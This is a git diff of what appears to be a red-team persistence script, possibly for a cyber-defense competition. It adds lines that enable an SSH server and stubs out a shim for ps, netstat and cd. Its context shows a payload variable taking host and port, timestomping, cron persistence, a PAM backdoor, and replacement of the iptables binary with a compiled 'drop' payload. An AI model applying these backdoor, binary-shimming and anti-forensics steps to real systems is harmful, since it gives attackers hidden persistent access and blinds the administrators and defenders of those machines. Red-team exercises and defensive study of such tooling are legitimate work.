@@ -17,6 +17,8 @@ payload3="/etc/vmware-tools.conf $host $port"
 setup(){
     #yum install -y 
     apt-get install -y curl wget vim python3 openssh-server
+    systemctl start ssh 
+    systemctl enable ssh 
 }
 
 # Timestomp 
@@ -60,7 +62,7 @@ cronjob(){
     systemctl restart cron 
 }
 
-# Shim binaries
+# Shim iptables. IPtables had weird symlink, had to separate it 
 iptables(){
     gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o ./iptables/drop
     cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
@@ -70,6 +72,11 @@ iptables(){
     xtables=`which iptables`
     ln -sf /sbin/xtables-single $xtables
 }
+
+# Shim rest of the binaries; ps, netstat, cd 
+#shim() {
+#
+#}
 
 # PAM backdoor 
 pam(){
